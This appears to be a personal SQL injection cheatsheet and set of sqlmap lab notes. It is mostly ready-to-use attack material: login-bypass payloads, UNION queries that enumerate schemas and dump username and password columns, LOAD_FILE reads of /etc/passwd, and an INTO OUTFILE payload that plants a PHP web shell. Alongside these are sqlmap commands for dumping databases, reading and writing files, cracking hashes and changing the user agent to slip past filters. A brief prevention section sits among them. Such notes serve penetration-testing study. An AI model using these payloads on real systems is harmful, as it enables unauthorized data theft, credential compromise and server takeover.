# SQL Injection (SQLi) Cheatsheet

## Introduction
SQL Injection (SQLi) allows an attacker to interfere with the queries that an application makes to its database. It can allow viewing data that is not normally retrievable, modifying data, or even executing administrative operations.

---

## Types of SQLi
1.  **In-Band (Classic)**:
    -   **Union-Based**: Uses the `UNION` operator to combine the results of two or more SELECT statements into a single result set.
    -   **Error-Based**: Forces the database to generate an error message that reveals information about the database structure.
2.  **Inferential (Blind)**:
    -   **Boolean-Based**: Sends queries to the database which force the application to return a different result depending on whether the query returns a TRUE or FALSE result.
    -   **Time-Based**: Sends queries that pause the database for a specified period if the query is TRUE.

---

## Discovery

### Authentication Bypass
Try to bypass login forms by making the condition always true.
```sql
admin' OR '1'='1' -- -
admin' OR '1'='1' #
admin' OR 1=1 --
```

### Identifying Injection Points
-   Add `'` or `"` to parameters to see if it causes an error.
-   **Boolean Test**:
    -   `id=1 AND 1=1` (Should return normal page)
    -   `id=1 AND 1=2` (Should return different/empty page)

---

## Exploitation (Union-Based)

### 1. Determine Number of Columns
Use `ORDER BY` to find the number of columns in the original query. Increment the number until you get an error.
```sql
' ORDER BY 1 -- -
' ORDER BY 2 -- -
' ORDER BY 3 -- -  <-- Error means there are 2 columns
```

### 2. Find Displayable Columns
Use `UNION SELECT` with the number of columns found. Check which numbers appear on the page.
```sql
' UNION SELECT 1, 2, 3 -- -
```
*Note: Ensure data types match. You can use `NULL` or strings if numbers fail.*

### 3. Enumeration
Once you know which columns are displayed (e.g., column 2), inject functions there.

| Information | MySQL / MariaDB | PostgreSQL | MSSQL |
| :--- | :--- | :--- | :--- |
| **Version** | `@@version` | `version()` | `@@version` |
| **Current User** | `user()`, `current_user()` | `current_user` | `user_name()` |
| **Database** | `database()` | `current_database()` | `db_name()` |

**Example:**
```sql
' UNION SELECT 1, database(), user(), 4 -- -
```

### 4. Database Schema Enumeration (MySQL)
**List Databases:**
```sql
' UNION SELECT 1, schema_name, 3, 4 FROM information_schema.schemata -- -
```

**List Tables (in current DB):**
```sql
' UNION SELECT 1, table_name, 3, 4 FROM information_schema.tables WHERE table_schema=database() -- -
```

**List Columns (in specific table):**
```sql
' UNION SELECT 1, column_name, 3, 4 FROM information_schema.columns WHERE table_name='users' -- -
```

### 5. Dumping Data
```sql
' UNION SELECT 1, username, password, 4 FROM users -- -
```
*Tip: Concatenate columns if you only have one display slot:*
```sql
' UNION SELECT 1, concat(username, ':', password), 3, 4 FROM users -- -
```

---

## Privilege Escalation & RCE (MySQL)

### Check Privileges
Check if the current user has `FILE` privilege (needed for reading/writing files).
```sql
' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user=user() -- -
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'" -- -
```

### Reading Files (`LOAD_FILE`)
Read sensitive files like `/etc/passwd` or configuration files.
```sql
' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4 -- -
```

### Writing Files (`INTO OUTFILE`)
Write a web shell to the web root (requires `secure_file_priv` to be empty and write permissions).

1.  **Check `secure_file_priv`**:
    ```sql
    ' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
    ```
2.  **Write Shell**:
    ```sql
    ' UNION SELECT 1, "<?php system($_GET['cmd']); ?>", 3, 4 INTO OUTFILE '/var/www/html/shell.php' -- -
    ```

---

## Prevention

1.  **Parameterized Queries (Prepared Statements)**: The most effective defense. Use placeholders (`?`) instead of concatenating input.
    ```php
    $stmt = $pdo->prepare('SELECT * FROM users WHERE email = ?');
    $stmt->execute([$email]);
    ```
2.  **Input Validation**: Validate against a whitelist (e.g., only allow integers for IDs).
3.  **Least Privilege**: Run the database service with a user that has minimum necessary privileges.
4.  **WAF**: Use a Web Application Firewall to block common SQL injection patterns.

## Sqlmap

```shell

# check the type of vulnerability
$ sqlmap -r req.txt  

# check privileges
sqlmap -r login.req --risk 3 --level 5 --technique=BEU --batch --privilege

# dump db
$ sqlmap -r req.txt --batch --dump 

# dump a table
sqlmap -r sqli.txt --dbms=mysql --D tablename -T users --batch --dump
# dump col


# read file 
sqlmap -r sqli.txt --dbms=mysql --dbs --batch --file-read=/etc/passwd

# write a file/webshell
sqlmap -r sqli.txt --dbms=mysql --dbs --batch --file-write=/var/www/html/shell.php --filex (not sure of syntax)
```

```shell-session
sqlmap -r sqli.txt --dbms=mysql --dbs --batch
sqlmap -r sqli.txt --dbms=mysql -D <dbname> --tables --batch

```
### techniques
- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
## effective cli input by copying http request as Curl

![](Pasted%20image%2020250613162532.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

```shell-session
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

## request methods

`POST` data, the `--data` flag can be used, as follows:

Running SQLMap on an HTTP Request

post request example:
```
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:

```shell-session
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

# ## Full HTTP Requests or headers only
we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the `-r` flag with burp
![](Pasted%20image%2020250613163228.png)

```shell-session
sqlmap -r req.txt
```

Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=`*`

# custom request

request with cookie value:
```shell-session
sqlmap <whatever> --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:

```shell-session
sqlmap  -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

other switches can be used to manipulate headers  `--random-agent` changes the default 
`User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`) which most protection solutions drop.
the `--mobile` switch can be used to imitate the smartphone by using that same header value.

 test the headers for the SQLi vulnerability
using `--cookie="id=1*"`

 specify HTTP method with `--method`, as follows:

```shell-session
sqlmap -u www.target.com --data='id=1' --method PUT
```

sqlmap suppots json, xml bodies in req.txt file
```shell-session
cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Ex
```

```shell-session
sqlmap -r req.txt
```

# SWITCHES
- hostname of the vulnerable target (`--hostname`)
- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)
- password hashes (`--passwords`)

## Table enumeration

- --tables
- database `-D <DBNAME>`
example:
```shell-session
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

dump format
--dump-format` to HTML or SQLite

HTML output
![](Pasted%20image%2020250614130736.png)
## Column Enumeration

specify columns
```shell-session
-C name,surname
```

narrow down row results 
```shell-session
--start=2 --stop=3

| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
| 3  | wu     | ming    |
```

### conditional enumeration

If there is a requirement to retrieve certain rows based on a known `WHERE` condition (e.g. `name LIKE 'f%'`), we can use the option `--where`, as follows:

```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"

...SNIP...
Database: testdb

Table: users
[1 entry]
+----+--------+---------+
| id | name   | surname |
+----+--------+---------+
| 2  | fluffy | bunny   |
```
## Full DB enumeration
a user is also advised to include the switch `--exclude-sysdbs` (e.g. `--dump-all --exclude-sysdbs`), which will instruct SQLMap to skip the retrieval of content from system databases, as it is usually of little interest for pentesters.

```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs 
```

# schema enumeration

```shell-session
sqlmap -u "http://www.example.com/?id=1" --schema

...SNIP...
Database: master
Table: log
[3 columns]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| date   | datetime     |
| agent  | varchar(512) |
| id     | int(11)      |
+--------+--------------+
```

# sqlmap search feature
we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:
```shell-session
$ sqlmap -u "http://www.example.com/?id=1" --search -T user 
# searches for tables with user in it

# --search -C pass 
searches for DBs,tables for columns with 'pass'
```


# hashcracking
sqlmap can also crack hashes on the fly

### dictionary attacks
involves comparing the hashes against a list of words, or a dictionary, to find a match.

### extract   passwords in system DBs and tables
(aka connection credentials)
attempt to dump the content of system tables containing database-specific credentials
```
sqlmap -u "http://www.example.com/?id=1" --passwords --batch


[14:25:20] [INFO] starting dictionary-based cracking (mysql_passwd)
[14:25:20] [INFO] starting 8 processes 
[14:25:26] [INFO] cracked password 'testpass' for user 'root'
database management system users password hashes:

[*] debian-sys-maint [1]:
    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
[*] root [1]:
    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
    clear-text password: testpass
```


# full enumeration
```
# provide the entire enumeration details.
-all --batch
```


What's the name of the column containing "style" in it's name? 
```
$ sqlmap -u "http:<target>/case1.php?id=1*" --search -C style --batch --no-cast 
```


What's the Kimberly user's password? (Case #1)
```
$ sqlmap -u "http://94.237.50.221:40349/case1.php?id=1*" -T users -C name,password  --where="name like 'k%'"  --batch --dump
```